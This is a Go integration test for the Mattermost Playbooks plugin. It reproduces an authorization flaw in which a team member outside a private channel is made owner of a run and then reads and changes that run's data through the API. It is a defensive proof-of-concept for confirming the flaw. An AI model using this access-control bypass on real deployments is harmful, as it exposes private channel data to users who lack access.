package main

import (
	"context"
	"encoding/json"
	"io"
	"net/http"
	"testing"

	"github.com/mattermost/mattermost/server/public/model"
	"github.com/stretchr/testify/require"

	"github.com/mattermost/mattermost-plugin-playbooks/client"
)

// TestChangeOwner_NonChannelMemberTeamUser reproduces the ChangeOwner authz gap:
// a team member who is not a member of the run's private channel can be assigned
// as owner, after which RunView grants them access solely because they are owner.
func TestChangeOwner_NonChannelMemberTeamUser(t *testing.T) {
	e := Setup(t)
	e.CreateBasic()

	ctx := context.Background()

	// The fixture's private channel is created by AdminUser. RegularUser2 is a
	// member of the team but not of this private channel.
	_, _, err := e.ServerAdminClient.GetChannelMember(ctx, e.BasicPrivateChannel.Id, e.RegularUser2.Id, "")
	require.Error(t, err, "fixture precondition: RegularUser2 must not be in the private channel")
	t.Logf("control: GetChannelMember(private=%s, user=%s) -> error: %v", e.BasicPrivateChannel.Id, e.RegularUser2.Id, err)

	_, err = e.PlaybooksAdminClient.Playbooks.CreatePropertyField(ctx, e.BasicPrivatePlaybook.ID, client.PropertyFieldRequest{Name: "ProofField", Type: "text"})
	require.NoError(t, err)

	createPublicRun := false
	run, err := e.PlaybooksAdminClient.PlaybookRuns.Create(ctx, client.PlaybookRunCreateOptions{
		Name:            "Private channel owner change",
		OwnerUserID:     e.AdminUser.Id,
		TeamID:          e.BasicTeam.Id,
		ChannelID:       e.BasicPrivateChannel.Id,
		PlaybookID:      e.BasicPrivatePlaybook.ID,
		CreatePublicRun: &createPublicRun,
	})
	require.NoError(t, err)
	require.Equal(t, e.AdminUser.Id, run.OwnerUserID)

	// Seed data that the new owner should not be able to read before the change.
	runFields, err := e.PlaybooksAdminClient.PlaybookRuns.GetPropertyFields(ctx, run.ID)
	require.NoError(t, err)
	require.NotEmpty(t, runFields)
	fieldID := runFields[0].ID
	_, err = e.PlaybooksAdminClient.PlaybookRuns.SetPropertyValue(ctx, run.ID, fieldID, client.PropertyValueRequest{Value: json.RawMessage(`"admin-value"`)})
	require.NoError(t, err)
	err = e.PlaybooksAdminClient.PlaybookRuns.UpdateStatus(ctx, run.ID, "admin status update", 86400)
	require.NoError(t, err)
	t.Logf("setup: status update seeded")

	// Negative control: before the owner change, RegularUser2 (team member,
	// not in the private channel, not a private-playbook member) cannot read
	// the run.
	serverClient2 := model.NewAPIv4Client(e.ServerClient.URL)
	_, _, err = serverClient2.Login(ctx, e.RegularUser2.Email, testUserPassword)
	require.NoError(t, err)
	respBefore, errBefore := e.DoPluginAPIRequestWithHeaders(ctx, serverClient2, http.MethodGet, "/api/v0/runs/"+run.ID, "", nil)
	require.Error(t, errBefore)
	t.Logf("control: GET /api/v0/runs/%s as RegularUser2 before owner change -> error: %v", run.ID, errBefore)
	if respBefore != nil {
		t.Logf("control: HTTP status before owner change: %d", respBefore.StatusCode)
	}
	for _, path := range []string{
		"/api/v0/runs/" + run.ID + "/status-updates",
		"/api/v0/runs/" + run.ID + "/property_fields",
		"/api/v0/runs/" + run.ID + "/property_values",
	} {
		resp, err := e.DoPluginAPIRequestWithHeaders(ctx, serverClient2, http.MethodGet, path, "", nil)
		require.Error(t, err, "control: %s must be denied before owner change", path)
		if resp != nil {
			t.Logf("control: GET %s before owner change -> status %d (error: %v)", path, resp.StatusCode, err)
		}
	}

	// AdminUser is the current owner and a channel member. ChangeOwner validates
	// only team membership for the new owner, not private-channel membership.
	err = e.PlaybooksAdminClient.PlaybookRuns.ChangeOwner(ctx, run.ID, e.RegularUser2.Id)
	require.NoError(t, err)
	t.Logf("POST /runs/%s/owner as AdminUser -> owner_id=%s (200)", run.ID, e.RegularUser2.Id)

	// RegularUser2 can now read the run through the API even though they were
	// never added to the private channel.
	resp, err := e.DoPluginAPIRequestWithHeaders(ctx, serverClient2, http.MethodGet, "/api/v0/runs/"+run.ID, "", nil)
	require.NoError(t, err)
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	require.NoError(t, err)
	t.Logf("GET /api/v0/runs/%s as RegularUser2 -> %d\n%s", run.ID, resp.StatusCode, string(body))
	require.Equal(t, http.StatusOK, resp.StatusCode)

	var raw map[string]interface{}
	require.NoError(t, json.Unmarshal(body, &raw))
	require.Equal(t, e.RegularUser2.Id, raw["owner_user_id"])
	require.Equal(t, e.BasicPrivateChannel.Id, raw["channel_id"])
	require.Equal(t, "Private channel owner change", raw["name"])

	for _, path := range []string{
		"/api/v0/runs/" + run.ID + "/status-updates",
		"/api/v0/runs/" + run.ID + "/property_fields",
		"/api/v0/runs/" + run.ID + "/property_values",
	} {
		resp, err := e.DoPluginAPIRequestWithHeaders(ctx, serverClient2, http.MethodGet, path, "", nil)
		require.NoError(t, err)
		body, err := io.ReadAll(resp.Body)
		require.NoError(t, err)
		resp.Body.Close()
		t.Logf("GET %s as RegularUser2 after owner change -> %d\n%s", path, resp.StatusCode, string(body))
		require.Equal(t, http.StatusOK, resp.StatusCode)
	}

	putBody := `{"value":"attacker-set"}`
	respPut, err := e.DoPluginAPIRequestWithHeaders(ctx, serverClient2, http.MethodPut, "/api/v0/runs/"+run.ID+"/property_fields/"+fieldID+"/value", putBody, map[string]string{"Content-Type": "application/json"})
	require.NoError(t, err)
	bodyPut, err := io.ReadAll(respPut.Body)
	require.NoError(t, err)
	respPut.Body.Close()
	t.Logf("PUT /api/v0/runs/%s/property_fields/%s/value as RegularUser2 -> %d\n%s", run.ID, fieldID, respPut.StatusCode, string(bodyPut))
	require.Equal(t, http.StatusOK, respPut.StatusCode)

	respVals, err := e.DoPluginAPIRequestWithHeaders(ctx, serverClient2, http.MethodGet, "/api/v0/runs/"+run.ID+"/property_values", "", nil)
	require.NoError(t, err)
	bodyVals, err := io.ReadAll(respVals.Body)
	require.NoError(t, err)
	respVals.Body.Close()
	t.Logf("GET /api/v0/runs/%s/property_values as RegularUser2 after PUT -> %d\n%s", run.ID, respVals.StatusCode, string(bodyVals))
	require.Equal(t, http.StatusOK, respVals.StatusCode)
	require.Contains(t, string(bodyVals), "attacker-set")

	got, err := e.PlaybooksClient2.PlaybookRuns.Get(ctx, run.ID)
	require.NoError(t, err)
	require.Equal(t, e.RegularUser2.Id, got.OwnerUserID)
}
